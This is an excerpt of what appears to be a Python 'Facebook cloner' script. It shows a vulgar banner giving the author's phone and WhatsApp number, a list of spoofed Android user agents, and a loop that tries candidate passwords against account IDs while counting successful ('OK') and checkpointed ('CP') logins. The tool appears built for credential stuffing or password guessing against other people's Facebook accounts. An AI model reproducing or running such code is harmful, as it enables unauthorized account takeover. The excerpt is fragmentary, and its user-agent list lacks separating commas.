...
def notice():
	...
	runtxt("\033[0;92m ADMIN🧞‍♀️ Facebook🤲+8801712034653")
	subprocess.check_output(["am", "start", "+8801712034653"])
...
\033[41m\033[1;37m[FUCK]   [BOY]   [ALAMGIR]   [YOUR-NEXT-PAPA]\x1b[0m
\033[1;32m┌───────────────────────────────────────┐
\033[1;33m│ [✓] AUTHOR   : FUCK BOY ALAMGIR \033[1;32m[ALAMGIR]         │
\033[1;34m│ [✓] GITHUB   : \033[41m\033[1;37mFUCK BOY ALAMGIR\x1b[0m           │
\033[1;35m│ [✓] WHATSAPP :  01712034653          │
\033[1;36m│ [✓] POWER  : \x1b[1;32mFUCK BOY ALAMGIR\x1b[1;97m           │
\033[1;32m└───────────────────────────────────────┘  
""")
		print("%s [%s•%s] %sTOOL NAME : %sAlamgir❌ PRO FUCK CLONER❌"%(G,R,G,B,G))
	...
	def api(self, uid, pwx):
		ua = random.choice([
            ...
            "Mozilla/5.0 (Linux; Android 9; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36;]"
            "Mozilla/5.0 (Linux; Android 11; V2102) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36;]"
            ...
            "Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.78 Mobile Safari/537.36;]"
            "Mozilla/5.0 (Linux; Android 10; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.78 Mobile Safari/537.36;]"
            "Mozilla/5.0 (Linux; Android 10; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.78 Mobile Safari/537.36;]"
            "Mozilla/5.0 (Linux; Android 10; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.78 Mobile Safari/537.36;]"
		...
		sys.stdout.write(
			"\r\r %s[>_] [Alamgir] : %s/%s -> \033[0;92m [ Alamgir-OK:%s ]- \033[0;91m[Alamgir-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
